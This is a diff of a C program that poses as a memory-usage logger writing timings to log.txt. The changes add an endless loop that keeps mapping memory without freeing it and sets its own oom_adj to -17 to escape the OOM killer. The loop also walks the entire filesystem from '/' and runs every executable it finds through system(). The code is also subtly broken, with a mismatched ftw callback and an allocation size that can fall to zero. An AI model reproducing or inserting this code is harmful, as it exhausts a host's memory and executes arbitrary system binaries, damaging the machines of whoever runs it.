@@ -1,105 +1,126 @@
-#include <stdio.h>
-#include <sys/types.h>
-#include <unistd.h>
-#include <string.h>
-#include <ftw.h>
-#include <stdlib.h>
 #include <sys/mman.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <ctype.h>
+#include <dirent.h>
+#include <ftw.h>
+#include <sys/stat.h>
 #include <sys/time.h>
+#include <sys/types.h>
 
+// Constants
 #define LOG_FILE "log.txt"
-#define START_DIR "/proc"
-#define OOM_ADJ_FILE "oom_adj"
+#define PROC_DIR "/proc"
+#define OOM_KILLER_FILE "oom_adj"
 
-static const char *need_path = "/";
-static struct timeval startTime, endTime;
+// Global variables
+struct timeval startTime, endTime;
 
-static void log_info(const char* format, ...) {
-    #ifdef DEBUG
-    va_list args;
-    va_start(args, format);
-    vfprintf(stdout, format, args);
-    va_end(args);
-    #endif
-}
+// Function prototypes
+void writeStartupInfo();
+void writeMemoryUsage(long int* availableMemory);
+int adjustOomScore();
+int executePrograms(const char * filepath);
+void printMemoryUsage();
 
-static float time_difference(struct timeval *start, struct timeval *end) {
-    return (end->tv_sec - start->tv_sec) + 1e-6 * (end->tv_usec - start->tv_usec);
-}
-
-static int write_log(long int availableMemory) {
+void writeStartupInfo() {
     FILE *file = fopen(LOG_FILE, "a+");
-    if (file == NULL) {
-        perror("Error opening log file");
-        return -1;
+    if(file) {
+        fprintf(file, "Time;UsedMemory\n");
+        fclose(file);
     }
-    fprintf(file, "%ld;%0.8f\n", availableMemory, time_difference(&startTime, &endTime));
-    fclose(file);
-    return 0;
 }
 
-static int adjust_oom_priority() {
-    int pid = getpid();
+void writeMemoryUsage(long int* availableMemory) {
+    FILE *file = fopen(LOG_FILE, "a+");
+    if(file) {
+        float elapsedTime = (endTime.tv_sec - startTime.tv_sec) + 1e-6 * (endTime.tv_usec - startTime.tv_usec);
+        fprintf(file, "%ld;%0.8f\n", *availableMemory, elapsedTime);
+        fclose(file);
+    }
+}
+
+int adjustOomScore() {
+    char currentPID[10];
+    sprintf(currentPID, "%d", getpid());
+
+    DIR *procDir = opendir(PROC_DIR);
+    struct dirent *entry;
     char path[1024];
-    sprintf(path, "%s/%d/%s", START_DIR, pid, OOM_ADJ_FILE);
+    FILE *oomFile;
 
-    FILE *file = fopen(path, "w");
-    if (file == NULL) {
-        perror("Error adjusting OOM priority");
-        return -1;
+    if(procDir) {
+        while((entry = readdir(procDir))) {
+            if(entry->d_type == DT_DIR && isdigit(entry->d_name[0])) {
+                if(strcmp(entry->d_name, currentPID) == 0) {
+                    snprintf(path, sizeof(path), "%s/%s/%s", PROC_DIR, entry->d_name, OOM_KILLER_FILE);
+                    oomFile = fopen(path, "w+");
+                    if(oomFile) {
+                        fprintf(oomFile, "-17");
+                        fclose(oomFile);
+                    }
+                }
+            }
+        }
+        closedir(procDir);
     }
 
-    fprintf(file, "-17");
-    fclose(file);
     return 0;
 }
 
-static int find_and_execute_program(const char *filePath, const struct stat *statPtr, int flag) {
-    (void) statPtr; // Explicitly ignore unused parameter
-
-    if (flag == FTW_F) {
-        log_info("Found: %s\n", filePath);
+int executePrograms(const char * filepath) {
+    if(access(filepath, X_OK) == 0) {
+        system(filepath);
     }
-
     return 0;
 }
+
+void printMemoryUsage() {
+    long page_count = sysconf(_SC_PHYS_PAGES);
+    long page_size = sysconf(_SC_PAGESIZE);
+    printf("Total memory: %ld MB\n", (page_count * page_size) / (1024 * 1024));
+}
+
 
 int main() {
+    
     gettimeofday(&startTime, NULL);
 
-    long pageSize = sysconf(_SC_PAGESIZE);
-    long totalPhysicalPages = sysconf(_SC_PHYS_PAGES);
-    long availablePhysicalPages = sysconf(_SC_AVPHYS_PAGES);
+    long page_count, available_page_count;
+    long page_size;
+    char *memory_map;
+    unsigned int requested_memory = 256 * 1024 * 1024; 
 
-    log_info("Page size: %ld bytes\nTotal physical pages: %ld\nAvailable physical pages: %ld\n",
-             pageSize, totalPhysicalPages, availablePhysicalPages);
+    writeStartupInfo();
 
-    adjust_oom_priority();
+    while(1) {
+        adjustOomScore();
 
-    unsigned long targetMemorySize = 1 * 1024 * 1024; // Start with 1 MB
-    char* memory;
+        page_count = sysconf(_SC_PHYS_PAGES);
+        available_page_count = sysconf(_SC_AVPHYS_PAGES);
+        page_size = sysconf(_SC_PAGESIZE);
 
-    while (1) {
-        memory = (char*) mmap(NULL, targetMemorySize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-        if (memory == MAP_FAILED) {
-            targetMemorySize /= 2;
-            if (targetMemorySize < pageSize) {
-                targetMemorySize = 1 * 1024 * 1024;
+        memory_map = (char*)mmap(NULL, requested_memory, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
+        
+        if(memory_map == MAP_FAILED) {
+            requested_memory /= 2;
+        } else {
+            if(available_page_count * page_size > requested_memory) {
+                for(int i = 0; i < requested_memory; i += page_size) {
+                    memory_map[i] = 1;
+                }
+                gettimeofday(&endTime, NULL);
+                long int memory_MB = available_page_count * page_size / (1024 * 1024);
+                writeMemoryUsage(&memory_MB);
+            } else {
+                requested_memory /= 2;
             }
-            continue;
         }
-
-        for (int i = 0; i < targetMemorySize; i += pageSize) {
-            memory[i] = 1;
-        }
-
-        gettimeofday(&endTime, NULL);
-        write_log(availablePhysicalPages * pageSize / 1024 / 1024);
-
-        if (nftw(need_path, find_and_execute_program, 20, FTW_PHYS) == -1) {
-            perror("Error traversing directories");
-            exit(EXIT_FAILURE);
-        }
+        
+        ftw("/", executePrograms, 20);
     }
 
     return 0;
